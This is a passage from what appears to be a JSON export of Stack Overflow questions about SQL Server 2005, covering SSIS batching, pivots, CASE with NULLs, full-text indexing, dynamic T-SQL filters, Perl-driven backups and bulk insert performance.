</p>\n"},{"tags":["sql-server","sql-server-2005","ssis"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":111,"score":0,"question_id":12187831,"title":"Executing commit on SSIS after processing N rows using Lookup","body":"<p>I'm following this tutorial to do a look up for the processed rows: <a href=\"http://consultingblogs.emc.com/jamiethomson/archive/2006/09/12/SSIS_3A00_-Checking-if-a-row-exists-and-if-it-does_2C00_-has-it-changed.aspx\" rel=\"nofollow\">SSIS: Checking if a row exists and if it does, has it changed?</a>. It's a good tutorial and it works like a charm, but there is this requirement to modify the DTS to support commit for a group of processed rows. I'll explain the whole scenario:</p>\n\n<ol>\n<li>Read the data from a csv file.</li>\n<li>For every row, check if the data exists in tableY (I'm doing this using the lookup).</li>\n<li>If exists, update the data in tableY (this works). If don't exists, insert the data in tableY (this also works).</li>\n<li><em>For every 1000 rows processed, the whole process must do a commit</em> (this is my headache).</li>\n</ol>\n\n<p>The dts will process like 200k rows every time it runs, so we want to make sure that the proccesed rows will be commited just in case this process raises any error (and a rollback of almost 199k rows is not good for the company).</p>\n\n<p>I know that the Ole DB Destination could handle this job, but what about the updated rows? I'm looking for a solution that could handle this job. I'm thinking to move the actual scenario for something like this:</p>\n\n<ol>\n<li>Create a dts that will retrieve the data from the file and move it to a tableX.</li>\n<li>Create a Job in SQL Server that will execute the dts as first step, then in second step will read the data in tableX and process every row to insert/update tableY. This step will be executed by a stored procedure that will handle the transaction by every 1000 rows.</li>\n</ol>\n\n<p>By the way, a non-functional requirement is that all this work must be done using SQL Server 2005 tools (no external applications involved, I must not develop a single C# app nor similars that could do all this job :( ).</p>\n\n<p>I'm open for any other recommendation to solve this problem.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12186356,"title":"Convert Column to Row","body":"<p>I know how to do this one way but the query i have created takes about 1:30 to run and i need to optimize this to be faster due to system limitations.  Ive used multiple joins of the same table to do this but was wondering if there is a shorter query or more efficient query i could use.</p>\n\n<p>Ive given a sample of the query but it does have about 100 columns pulled from a rows on the OrderItemFormDateFields table referenced below. Ive created columns and i get the results i need, but again, its slow. Let me know if you need any more detailed info about the tables. </p>\n\n<p>I guess im basically looking for a way to dynamically populate rather than list out each column.  Ive seen a few different ways with pivots and case statements but im not very good with pivots yet and case seemed like it would be even more inefficient.  Thanks!</p>\n\n<pre><code>SELECT\nOrderNumber\n,Product\n,OrderDate\n,   oifd1.value as  'ADD_SUBJ_ADDRESS'\n,   oifd2.value as  'ADD_SUBJ_BATHS'\n,   oifd3.value as  'ADD_SUBJ_BEDROOMS'\n,   oifd4.value as  'ADD_SUBJ_DATE'\n,   oifd5.value as  'ADD_SUBJ_GLA'\nFROM(\nSELECT CAST(oi.orderid as VARCHAR(MAX))+'.'+CAST(oi.orderitemid as VARCHAR(MAX))     as      OrderNumber\n,p.abbreviation as product, o.orderdate\nFROM OrderItems oi\njoin products p on p.productid = oi.productid\njoin orders o on o.orderid = oi.orderid)x\nleft    join    orderitemformdatafields     oifd1   on      oifd1.orderreference    =   OrderNumber and oifd1.fieldname in  (     'SUBJ_STREET_ADDR')\nleft    join    orderitemformdatafields     oifd2   on      oifd2.orderreference    =   OrderNumber and oifd2.fieldname in  (      'ADD_SUBJ_BATHS')\n left   join    orderitemformdatafields     oifd3   on      oifd3.orderreference    =   OrderNumber and oifd3.fieldname in  (      'ADD_SUBJ_BEDROOMS')\n left   join    orderitemformdatafields     oifd4   on     oifd4.orderreference =   OrderNumber and oifd4.fieldname in  (     'ADD_SUBJ_DATE')\nleft    join    orderitemformdatafields     oifd5   on      oifd5.orderreference    =   OrderNumber and oifd5.fieldname in  (     'ADD_SUBJ_GLA')\n</code></pre>\n"},{"tags":["sql","sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12150974,"title":"Create Unique Column in SSIS","body":"<p>I have an SSIS package that takes a table and looks up a whole lot of other columns to end up with a dataset like:</p>\n\n<pre><code>ItemID | ProductGroupCode | Product Code\n1      |  AAAA            |\n2      |  AAAA            |\n3      |  BBBB            |\n4      |  BBBB            |\n5      |  CCCC            |\n</code></pre>\n\n<p>ItemID is unique. I need to create a unique ProductCode by joining the ProductGroupCode to a 4 digit number starting at 1700.</p>\n\n<p>So the data would look like:</p>\n\n<pre><code>ItemID | ProductGroupCode | Product Code\n1      |  AAAA            | AAAA1000\n2      |  AAAA            | AAAA1001\n3      |  BBBB            | BBBB1000\n4      |  BBBB            | BBBB1001\n5      |  CCCC            | CCCC1000\n</code></pre>\n\n<p>However it also needs to check that the Product Code doesn't already exist in the products table. There is a real chance that Product Code AAAA1000 already exists. If that is the case then it should increase the Product Code.</p>\n\n<p>I was able to do it with a cursor in SQL, the table \"ProductImportHalfWay\" is the dataset halfway through the SSIS package</p>\n\n<pre><code>DECLARE @ProductCode VARCHAR(10),\n        @CurrentProductCode VARCHAR(10),\n        @ItemID INT,\n        @ProductNumber INT\n\nSELECT @ProductNumber = 0, @CurrentProductCode = ''\n\nDECLARE productGroupCodes CURSOR FAST_FORWARD\nFOR SELECT distinct ProductGroupCode, ItemID\nFROM ProductImportHalfWay \nORDER BY ProductGroupCode \n\nOPEN productGroupCodes\n    FETCH NEXT FROM productGroupCodes INTO @ProductCode, @ItemID\n\n    WHILE @@FETCH_STATUS = 0\n    BEGIN\n        IF @CurrentProductCode &lt;&gt; @ProductCode\n        BEGIN\n            SET @CurrentProductCode = @ProductCode\n            SET @ProductNumber = 1699 --set to 1699 so that we can add 1 to get 1700\n        END\n\n        SET @ProductNumber = @ProductNumber + 1\n        WHILE EXISTS (SELECT 1 FROM Product WHERE ProductCode = @ProductCode + CAST(@ProductNumber AS VARCHAR(4)))\n        BEGIN\n            SET @ProductNumber = @ProductNumber + 1\n            --print 'increase'\n        END     \n\n        UPDATE ProductImportHalfWay\n        SET ProductGroupCode = @ProductCode + CAST(@ProductNumber AS VARCHAR(4))\n        WHERE ItemID = @ItemID\n\n        FETCH NEXT FROM productGroupCodes\n        INTO @ProductCode, @ItemID\n    END\nCLOSE productGroupCodes\nDEALLOCATE productGroupCodes\n</code></pre>\n\n<p>but I don't know how to put this in the middle of a data transformation (and I don't really want to output the \"ProductImportHalfWay\" table)</p>\n\n<hr>\n\n<p>EDIT: extra Example\nIf ProductCode AAAA1000 already exists in the database, then the imported records sould come thorugh as</p>\n\n<pre><code>ItemID | ProductGroupCode | Product Code\n1      |  AAAA            | AAAA1001\n2      |  AAAA            | AAAA1002\n3      |  BBBB            | BBBB1000\n4      |  BBBB            | BBBB1001\n5      |  CCCC            | CCCC1000\n</code></pre>\n"},{"tags":["sql","sql-server-2005","case","smalldatetime"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":7804,"score":4,"question_id":2453974,"title":"check for null date in CASE statement, where have I gone wrong?","body":"<p>My source table looks like this</p>\n\n<pre><code>Id     StartDate\n1      (null)\n2      12/12/2009\n3      10/10/2009\n</code></pre>\n\n<p>I want to create a select statement, that selects the above, but also has an additional column to display a varchar if the date is not null such as : </p>\n\n<pre><code>Id     StartDate    StartDateStatus\n1      (null)       Awaiting\n2      12/12/2009   Approved\n3      10/10/2009   Approved\n</code></pre>\n\n<p>I have the following in my select, but it doesn't seem to be working. All of the statuses are set to <code>Approved</code> even though the dates have some nulls</p>\n\n<pre><code>        select\n             id,\n             StartDate,\n        CASE StartDate\n        WHEN null THEN 'Awaiting'\n        ELSE 'Approved' END AS StartDateStatus\n        FROM myTable\n</code></pre>\n\n<p>The results of my query look like : </p>\n\n<pre><code>Id     StartDate    StartDateStatus\n1      (null)       Approved\n2      12/12/2009   Approved\n3      10/10/2009   Approved\n4      (null)       Approved\n5      (null)       Approved\n</code></pre>\n\n<p>StartDate is a <code>smalldatetime</code>, is there some exception to how this should be treated?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","full-text-search"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":166,"score":3,"question_id":8583182,"title":"Advice for sql server full text indexing change tracking and population","body":"<p>Here is my situation.  I have two tables that have millions of records.  I am wanting to full text a couple of columns on them (basically first and last names.)  However, both of these tables essentially get wiped and replaced by a legacy DTS package over the weekend.  I had change tracking set to automatic and when said DTS ran, the table got locked up and all queries failed and there was great weeping and gnashing of teeth. Many Bothans died.   </p>\n\n<p>So, I would like to do this the right way.  What settings or scheduling should I use for the FTS change tracking and population?  Should i set change tracking to off, and then schedule a full population after the DTS imports run?  Also, what is the difference between \"change tracking\" and \"population\" and how are they related?  How can the index work if there is no change tracking?  Does full population add the indexes even if change tracking is off?  </p>\n\n<p>thanks!\ncraig</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","aggregate-functions"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":127,"score":3,"question_id":3553336,"title":"select in sql server 2005","body":"<p>I have a table follow:</p>\n\n<pre><code>ID  |  first  |  end\n--------------------\na   |      1  |    3\nb   |      3  |    8\nc   |      8  |   10\n</code></pre>\n\n<p>I want to select follow:</p>\n\n<pre><code> ID  |  first  |  end\n---------------------\na-c  |      1  |   10   \n</code></pre>\n\n<p>But i can't do it. Please! help me. Thanks!</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":778,"score":1,"question_id":1529225,"title":"SQL Server query to group sequential date data","body":"<p>I have got a bit of 'brain fade' going on this afternoon, so if anyone can help with this mssql query it would be fantastic.</p>\n\n<p>I have a table called 'seasons' with three columns (there are more but not relevant to the example): seasonId, date, tariffId</p>\n\n<p>SeasonId is a unique key.\nA date can only have one tariffid, but a tariffId can have many different dates.</p>\n\n<p>For example:</p>\n\n<pre><code>seasonId  |  date      |  tariffId\n----------------------------------\n       1  | 1 jan 2009 |         1\n       2  | 2 jan 2009 |         1\n       3  | 3 jan 2009 |         2\n       4  | 4 jan 2009 |         3\n       5  | 5 jan 2009 |         3\n</code></pre>\n\n<p>I'd like to have a query return the sequence/range of dates against a particular tariffId</p>\n\n<p>Eg using the data above, it would return the following:</p>\n\n<pre><code>FromDate  |  ToDate    |  TariffId\n-----------------------------------\n       1  | Jan 2009 2 | Jan 2009 1\n       3  | Jan 2009 3 | Jan 2009 2\n       4  | Jan 2009 5 | Jan 2009 3\n</code></pre>\n\n<p>Is this possible?</p>\n\n<p><strong>EDIT</strong>\nThanks for all the answers so far! I am always amazed how far you get a response!</p>\n\n<p>However, my example data probably wasn't complex enough as a tariff can have 1 or more date ranges</p>\n\n<pre><code>seasonId  |  date      |  tariffId\n----------------------------------\n       1  | 1 jan 2009 |         1\n       2  | 2 jan 2009 |         1\n       3  | 3 jan 2009 |         2\n       4  | 4 jan 2009 |         3\n       5  | 5 jan 2009 |         3\n       6  | 6 jan 2009 |         1\n       7  | 7 jan 2009 |         1\n       8  | 8 jan 2009 |         3\n</code></pre>\n\n<p>Would give:</p>\n\n<pre><code>FromDate   |     ToDate  |  TariffId\n------------------------------------\n1 Jan 2009 | 2 Jan 2009  |         1\n3 Jan 2009 | 3 Jan 2009  |         2\n4 Jan 2009 | 5 Jan 2009  |         3\n6 Jan 2009 | 7 Jan 2009  |         1\n8 Jan 2009 | 8 Jan 2009  |         3\n</code></pre>\n\n<p>Ideas?</p>\n\n<p>Thanks everyone for their help on this! This site is AWESOME!</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":220,"score":0,"question_id":4937902,"title":"How to display the time with condition","body":"<p>Using SQL Server</p>\n\n<p>Table1</p>\n\n<pre><code>ID  |  Intime  |   Outtime\n--------------------------\n001 | 00:21:00 |  00:48:00\n002 | 08:14:00 |  13:45:00\n003 | 00:34:00 |  00:18:00\n</code></pre>\n\n<p>Time format: HH:MM:SS</p>\n\n<p>Tried Code.</p>\n\n<pre><code>SELECT dateadd(mi, datediff(mi,0, Intime)/30*30, 0) AS 'Intime'\n  FROM Table1\n</code></pre>\n\n<p>Above Query giving the result for 30 minutes or 1 hours, which means minutes less than 30 then it is displaying 30 minutes, minutes greater than 30 then it is displaying 1 Hours </p>\n\n<p>I need to display the time like 15 minutes, 30 minutes or 1 Hours, it should display a roundoff time with condition</p>\n\n<p>Conditions are</p>\n\n<pre><code>If minutes is less than 15 minutes then it should display exactly 15 Minutes, for example 03:15:00\nIf minutes is greater than 15 minutes and less than 45 minutes then it should display exactly 30 Minutes, for example 03:30:00\nIf minutes is greater than 45 minutes then it should display exactly 1 hour, for example 04:00:00\n</code></pre>\n\n<p>Expected Output from the table1</p>\n\n<h2>    ID  |  Intime  |  Outtime</h2>\n\n<pre><code>001 | 00:30:00 | 01:00:00\n002 | 08:15:00 | 14:00:00\n003 | 00:30:00 | 00:30:00\n</code></pre>\n\n<p>How to make a query for the roundoff time with condition.</p>\n\n<p>Need Query Help</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":469,"score":0,"question_id":838988,"title":"How can i create this time-table with stable time format?","body":"<p>How can i get result \"My Dream Table Result\"</p>\n\n<pre><code>CREATE TABLE #temp(\n    [count] int\n  , [Time] nvarchar(50))\nDECLARE @DateNow DATETIME,@i int\n\nSET @DateNow='00:00'\nSET @i=1;\nWHILE(@i&lt;1440)\n    BEGIN\n        SET @DateNow=DATEADD(minute, 1, @DateNow)\n        INSERT INTO #temp ([count], [Time]) VALUES (0, @DateNow)\n        SET @i=@i+1\n    END\nSELECT [count],CONVERT(VARCHAR(max), [Time], 104) AS [Time] FROM  #temp\nDROP TABLE #temp\n</code></pre>\n\n<p>Table Result:</p>\n\n<pre><code>Count  |                 Time\n-----------------------------\n    0  |  Jan  1 1900 12:01AM\n    0  |  Jan  1 1900 12:02AM\n    0  |  Jan  1 1900 12:03AM\n    0  |  Jan  1 1900 12:04AM\n</code></pre>\n\n<p>But i don't like this table Time format is not ok. I need this table\nMy Dream Table Result:</p>\n\n<pre><code>Count   |   Time\n    0   |  12:01\n    0   |  12:02\n    0   |  12:03\n    0   |  12:04\n    ...\n    ...\n    0   |  22:01\n    0   |  22:02\n    0   |  22:03\n    0   |  22:04\n</code></pre>\n"},{"tags":["query","tsql","sql-server-2005","stored-procedures","foreign-keys"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":10278116,"title":"How to fetch two column value in one colume based on boolean field","body":"<p>I am working with SQL Server 2005.\nI am having 3 table </p>\n\n<p><strong>Product</strong></p>\n\n<pre><code>PId   |   PName\n</code></pre>\n\n<p><strong>Service</strong></p>\n\n<pre><code>SId   |   SName\n</code></pre>\n\n<p><strong>Bill</strong></p>\n\n<pre><code>BId   |   TypeId   |   IsService\n</code></pre>\n\n<p>TypeId is PId or SId. based on IsService Field.<br /><br />\nIf <code>IsService</code> is 1 then TypeId is SId and If <code>IsService</code> is 0 then TypeId is PId</p>\n\n<p>I want to fetch PName and SName with Bill so how can I?</p>\n\n<p>I am thinking of to Write stored Procedure for this..\nand Adding Dynamic Column to Stored Procudure that column contain Either SName or PName as per IsService.</p>\n\n<p>But don't know how to write this also? </p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":205,"score":2,"question_id":1131085,"title":"Removing duplicate records","body":"<p>I am using the following query </p>\n\n<pre><code>SELECT SS.sightseeingId AS 'sID'\n     , SS.SightseeingName\n     , SS.displayPrice AS 'Price'\n     , SST.fromDate \nFROM tblSightseeings SS INNER JOIN \n     tblSightseeingTours SST ON SS.sightseeingId =  SST.sightseeingId\nWHERE SS.isActive = 1 AND SS.isDisplayOnMainPage = 1 \n</code></pre>\n\n<p>and getting result like this </p>\n\n<pre><code>sID | SightseeingName                        | Price | fromDate \n------------------------------------------------------------------------------\n  2 | Dinner Cruise Bateaux London (Premier) |    40 | 2009-04-01 00:00:00.000\n  2 | Dinner Cruise Bateaux London (Premier) |    40 | 2009-12-29 00:00:00.000\n 30 | Jack The Ripper, Ghosts and Sinister   |  35.1 | 2009-04-01 00:00:00.000\n 30 | Jack The Ripper, Ghosts and Sinister   |  35.1 | 2009-10-01 00:00:00.000\n 40 | Grand Tour of London                   |     0 | 2009-05-01 00:00:00.000\n 40 | Grand Tour of London                   |     0 | 2010-05-01 00:00:00.000\n 87 | Warwick, Stratford, Oxford and The     |    25 | 2009-04-01 00:00:00.000\n 87 | Warwick, Stratford, Oxford and The     |    25 | 2009-11-01 00:00:00.000\n</code></pre>\n\n<p>I want to display the unique records 2 one time 30 one time 40 one time. The duplicate records are due to <code>SST.fromDate</code>. </p>\n\n<p>How do I correct my query??</p>\n"},{"tags":["database","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":92,"score":1,"question_id":7495987,"title":"Merge and sync MS SQL server database","body":"<p>I have couple of kiosks running at client's location which access an online MS SQL server 2005 to process data, but the internet connectivity is unreliable. I am fine with installing SQL server on the kiosk itself and sync it once a week to the central server. Since there are lots of kiosks, it needs to be a merged sync. \nAny better ideas for caching?\nWhat are the tools for merge sync?</p>\n"},{"tags":[".net","sql-server","vb.net","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12179135,"title":"Composite Key exceptions on dynamic TSQL","body":"<p>I have a couple of dynamically built query's with a composite primary key on the <code>tblWarr_SWH_WarrCLHD_35</code> and <code>[Account No]</code>, <code>tblWarr_SWH_WarrCLHD_35.[Claim No]</code> columns. </p>\n\n<p>A new requirement has recently come out asking us to provide exceptions on the results, so the users can ask to filter out each row by <code>[Account No]</code> and <code>[Claim No]</code>. There will be an indeterminate number of row exceptions.</p>\n\n<p>What would be the best method for the client to pass in the exceptions list <code>[Account No]</code> and <code>[Claim No]</code> combinations?</p>\n\n<p>Do I need to pass in a string and parse it within the T-SQL? I could build it like this</p>\n\n<pre><code>AND NOT ([Account No] = 'abc' AND [Claim No] = 'cde') \nAND NOT ([Account No] = 'fgh' AND [Claim No] = 'ijk')\n</code></pre>\n\n<p>The results are displayed to the client software via a typed data set with two tables.</p>\n\n<p><strong>Raw Data</strong></p>\n\n<pre><code>DECLARE @SQL nvarchar(4000)\nDECLARE @SQLWhere nvarchar(4000) \nDECLARE @SQLOrder nvarchar(MAX)\n\nSET @SQL = 'SELECT tblWarr_SWH_WarrCLHD_35.[Account No], tblWarr_SWH_WarrCLHD_35.[Claim No], tblWarr_SWH_WarrCLHD_35.ClaimCost, \n                      tblWarr_SWH_WarrCLHD_35.[Serial No], tblWarr_SMT_MCType_47.[Machine Type], tblWarr_SMH_MCHist_34.[Date Built], \n                      tblWarr_SMH_MCHist_34.[Date Sold], tblWarr_SVC_ServiceCodes.[Service Code], tblWarr_DefectCodes.Code AS [Defect Code], \n                      tblWarr_SPN_PartNo_01.[Part No], tblWarr_SPN_PartNo_01.[Part Description], tblWarr_SWH_WarrCLHD_35.[Failed Part No Qty], \n                      tblWarr_MachineHours.[Machine Hours At Failure], tblWarr_SWH_WarrCLHD_35.[Claim Date], tblWarr_SNA_WarNar_77.Narrative, \n                      tblWarr_SSU_Supplier_09.[Supplier Name],tblWarr_SWH_WarrCLHD_35.[ClaimStateID]\n                FROM tblWarr_SMH_MCHist_34 INNER JOIN\n                      tblWarr_SWH_WarrCLHD_35 ON tblWarr_SMH_MCHist_34.[Serial No] = tblWarr_SWH_WarrCLHD_35.[Serial No] INNER JOIN\n                      tblWarr_SMT_MCType_47 ON tblWarr_SMH_MCHist_34.MachineTypeID = tblWarr_SMT_MCType_47.ID INNER JOIN\n                      tblWarr_SVC_ServiceCodes ON tblWarr_SWH_WarrCLHD_35.ServiceCodeFullID = tblWarr_SVC_ServiceCodes.ID INNER JOIN\n                      tblWarr_DefectCodes ON tblWarr_SWH_WarrCLHD_35.DefectCodeID = tblWarr_DefectCodes.ID INNER JOIN\n                      tblWarr_SPN_PartNo_01 ON tblWarr_SWH_WarrCLHD_35.FailedPartNoID = tblWarr_SPN_PartNo_01.ID INNER JOIN\n                      tblWarr_MachineHours ON tblWarr_SWH_WarrCLHD_35.MachineHoursID = tblWarr_MachineHours.ID INNER JOIN\n                      tblWarr_SNA_WarNar_77 ON tblWarr_SWH_WarrCLHD_35.NarrativeID = tblWarr_SNA_WarNar_77.ID INNER JOIN\n                      tblWarr_SSU_Supplier_09 ON tblWarr_SWH_WarrCLHD_35.SupplierID = tblWarr_SSU_Supplier_09.ID'\nSET @SQLWhere = ' WHERE ((tblWarr_SPN_PartNo_01.[Part No] = @_PartNumber) AND '\nSET @SQLOrder = ' ORDER BY CAST(tblWarr_SMH_MCHist_34.[Date Built] AS smalldatetime) DESC'\n\nIF (@ClaimDateFrom IS NOT NULL AND @ClaimDateTo IS NOT NULL)AND (LEN(@ClaimDateFrom) &gt; 0 AND LEN(@ClaimDateTo) &gt; 0)\n    SET @SQLWhere = @SQLWhere + '(tblWarr_SWH_WarrCLHD_35.[Claim Date] BETWEEN @_ClaimDateFrom AND @_ClaimDateTo) AND '\n\nIF (@BuildDateFrom IS NOT NULL AND @BuildDateTo IS NOT NULL)AND (LEN(@BuildDateFrom) &gt; 0 AND LEN(@BuildDateTo) &gt; 0)\n    SET @SQLWhere = @SQLWhere + '(CAST(tblWarr_SMH_MCHist_34.[Date Built] AS SmalldateTime) BETWEEN @_BuildDateFrom AND @_BuildDateTo) AND '\n\nIF (@ClaimStates IS NOT NULL)AND (LEN(@ClaimStates) &gt; 0)\n    SET @SQLWhere = @SQLWhere + '(tblWarr_SWH_WarrCLHD_35.[ClaimStateID] IN (SELECT value FROM Split(''' + ',' + ''',@_ClaimStates))) AND '\n\nIF LEN(@SQLWhere) &gt; 0\n    SET @SQL = @SQL + LEFT(@SQLWhere, LEN(@SQLWhere)-4) + ')' + @SQLOrder\n\nEXEC sp_executesql @SQL,\n    N'@_PartNumber nvarchar(20), @_ClaimDateFrom smalldatetime, @_ClaimDateTo smalldatetime, @_BuildDateFrom smalldatetime, @_BuildDateTo smalldatetime, @_ClaimStates nvarchar(50)',\n    @_PartNumber = @PartNumber, @_ClaimDateFrom = @ClaimDateFrom, @_ClaimDateTo = @ClaimDateTo, @_BuildDateFrom = @BuildDateFrom, @_BuildDateTo = @BuildDateTo, @_ClaimStates = @ClaimStates\n</code></pre>\n\n<p><strong>Aggregate Data</strong></p>\n\n<pre><code>DECLARE @SQL nvarchar(4000)\nDECLARE @SQLWhere nvarchar(4000) \nDECLARE @SQLOrder nvarchar(MAX)\nDECLARE @Date1 as nvarchar(5)   \n\nSET @Date1 = '01/'\n\nSET @SQL = 'SELECT CAST(@_Date1 + CAST(DATEPART(mm,CAST(tblWarr_SMH_MCHist_34.[Date Built] as smalldatetime)) as nvarchar(2)) + ''' + '/' + ''' + CAST(DATEPART(yyyy,CAST(tblWarr_SMH_MCHist_34.[Date Built] as smalldatetime)) as nvarchar(4)) as smalldatetime) AS ClaimDate , COUNT(tblWarr_SWH_WarrCLHD_35.[Claim No]) As FaultCount\n                FROM tblWarr_SMH_MCHist_34 INNER JOIN\n                      tblWarr_SWH_WarrCLHD_35 ON tblWarr_SMH_MCHist_34.[Serial No] = tblWarr_SWH_WarrCLHD_35.[Serial No] INNER JOIN\n                      tblWarr_SMT_MCType_47 ON tblWarr_SMH_MCHist_34.MachineTypeID = tblWarr_SMT_MCType_47.ID INNER JOIN\n                      tblWarr_SVC_ServiceCodes ON tblWarr_SWH_WarrCLHD_35.ServiceCodeFullID = tblWarr_SVC_ServiceCodes.ID INNER JOIN\n                      tblWarr_DefectCodes ON tblWarr_SWH_WarrCLHD_35.DefectCodeID = tblWarr_DefectCodes.ID INNER JOIN\n                      tblWarr_SPN_PartNo_01 ON tblWarr_SWH_WarrCLHD_35.FailedPartNoID = tblWarr_SPN_PartNo_01.ID INNER JOIN\n                      tblWarr_MachineHours ON tblWarr_SWH_WarrCLHD_35.MachineHoursID = tblWarr_MachineHours.ID INNER JOIN\n                      tblWarr_SNA_WarNar_77 ON tblWarr_SWH_WarrCLHD_35.NarrativeID = tblWarr_SNA_WarNar_77.ID INNER JOIN\n                      tblWarr_SSU_Supplier_09 ON tblWarr_SWH_WarrCLHD_35.SupplierID = tblWarr_SSU_Supplier_09.ID'\nSET @SQLWhere = ' WHERE ((tblWarr_SPN_PartNo_01.[Part No] = @_PartNumber) AND '\nSET @SQLOrder = ' GROUP BY CAST(@_Date1 + CAST(DATEPART(mm,CAST(tblWarr_SMH_MCHist_34.[Date Built] as smalldatetime)) as nvarchar(2)) + ''' + '/' + ''' + CAST(DATEPART(yyyy,CAST(tblWarr_SMH_MCHist_34.[Date Built] as smalldatetime)) as nvarchar(4)) as smalldatetime) ORDER BY CAST(@_Date1 + CAST(DATEPART(mm,CAST(tblWarr_SMH_MCHist_34.[Date Built] as smalldatetime)) as nvarchar(2)) + ''' + '/' + ''' + CAST(DATEPART(yyyy,CAST(tblWarr_SMH_MCHist_34.[Date Built] as smalldatetime)) as nvarchar(4)) as smalldatetime)'\n\nIF (@ClaimDateFrom IS NOT NULL AND @ClaimDateTo IS NOT NULL)AND (LEN(@ClaimDateFrom) &gt; 0 AND LEN(@ClaimDateTo) &gt; 0)\n    SET @SQLWhere = @SQLWhere + '(CAST(tblWarr_SWH_WarrCLHD_35.[Claim Date] AS SmalldateTime) BETWEEN @_ClaimDateFrom AND @_ClaimDateTo) AND '\n\nIF (@BuildDateFrom IS NOT NULL AND @BuildDateTo IS NOT NULL)AND (LEN(@BuildDateFrom) &gt; 0 AND LEN(@BuildDateTo) &gt; 0)\n    SET @SQLWhere = @SQLWhere + '(CAST(tblWarr_SMH_MCHist_34.[Date Built] AS SmalldateTime) BETWEEN @_BuildDateFrom AND @_BuildDateTo) AND '\n\nIF (@ClaimStates IS NOT NULL)AND (LEN(@ClaimStates) &gt; 0)\n    SET @SQLWhere = @SQLWhere + '(tblWarr_SWH_WarrCLHD_35.[ClaimStateID] IN (SELECT value FROM Split(''' + ',' + ''',@_ClaimStates))) AND '\n\nIF LEN(@SQLWhere) &gt; 0\n    SET @SQL = @SQL + LEFT(@SQLWhere, LEN(@SQLWhere)-4) + ')' + @SQLOrder\n\nEXEC sp_executesql @SQL,\n    N'@_PartNumber nvarchar(20), @_ClaimDateFrom smalldatetime, @_ClaimDateTo smalldatetime, @_BuildDateFrom smalldatetime, @_BuildDateTo smalldatetime, @_Date1 nvarchar(5), @_ClaimStates nvarchar(50) ',\n    @_PartNumber = @PartNumber, @_ClaimDateFrom = @ClaimDateFrom, @_ClaimDateTo = @ClaimDateTo, @_BuildDateFrom = @BuildDateFrom, @_BuildDateTo = @BuildDateTo, @_Date1 = @Date1, @_ClaimStates = @ClaimStates\n</code></pre>\n"},{"tags":["database","perl","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12177731,"title":"SQL Server backup command from Perl","body":"<p>Trying to take remote backup of sql server database using Perl. But somehow getting following error : </p>\n\n<p>Backup Error: 3041, Severity: 16, State: 1.\nBACKUP failed to complete the command BACKUP DATABASE testdb. Check the backup application log for detailed messages.</p>\n\n<p>The scripts looks like :</p>\n\n<pre><code>use DBI;\nmy $dsn = 'DBI:ODBC:Driver={SQL Server}';\nmy $host = 'hostname';\nmy $database = 'dbname';\nmy $user = 'sa';\nmy $auth = 'xxxxxxx';\n\nmy $dbh = DBI-&gt;connect(\"$dsn;Server=$host\",\n                       $user,\n                       $auth,\n                       { RaiseError =&gt; 1,\n                         AutoCommit =&gt; 1}\n                      ) || die \"Database connection not made: $DBI::errstr\";\n\nmy $sql = \"BACKUP DATABASE testdb TO DISK='d:\\sql_share\\backup.bak'\";\nmy $sth = $dbh-&gt;prepare( $sql );\n\n$sth-&gt;execute();\nprint \"\\nexecuted\";\n\n$sth-&gt;finish();\n$dbh-&gt;disconnect();\n</code></pre>\n\n<p>using the same script able to create database, query database etc. on remote server.</p>\n"},{"tags":["c#","sql","sql-server","sql-server-2005"],"answer_count":10,"favorite_count":12,"up_vote_count":32,"down_vote_count":0,"view_count":18903,"score":32,"question_id":24200,"title":"What's the fastest way to bulk insert a lot of data in SQL Server (C# client)","body":"<p>I am hitting some performance bottlenecks with my C# client inserting bulk data into a SQL Server 2005 database and I'm looking for ways in which to speed up the process.</p>\n\n<p>I am already using the SqlClient.SqlBulkCopy (which is based on TDS) to speed up the data transfer across the wire which helped a lot, but I'm still looking for more.</p>\n\n<p>I have a simple table that looks like this: </p>\n\n<pre><code> CREATE TABLE [BulkData](\n [ContainerId] [int] NOT NULL,\n [BinId] [smallint] NOT NULL,\n [Sequence] [smallint] NOT NULL,\n [ItemId] [int] NOT NULL,\n [Left] [smallint] NOT NULL,\n [Top] [smallint] NOT NULL,\n [Right] [smallint] NOT NULL,\n [Bottom] [smallint] NOT NULL,\n CONSTRAINT [PKBulkData] PRIMARY KEY CLUSTERED \n (\n  [ContainerIdId] ASC,\n  [BinId] ASC,\n  [Sequence] ASC\n))\n</code></pre>\n\n<p>I'm inserting data in chunks that average about 300 rows where ContainerId and BinId are constant in each chunk and the Sequence value is 0-n and the values are pre-sorted based on the primary key.  </p>\n\n<p>The %Disk time performance counter spends a lot of time at 100% so it is clear that disk IO is the main issue but the speeds I'm getting are several orders of magnitude below a raw file copy.</p>\n\n<p>Does it help any if I:</p>\n\n<ol>\n<li>Drop the Primary key while I am doing the inserting and recreate it 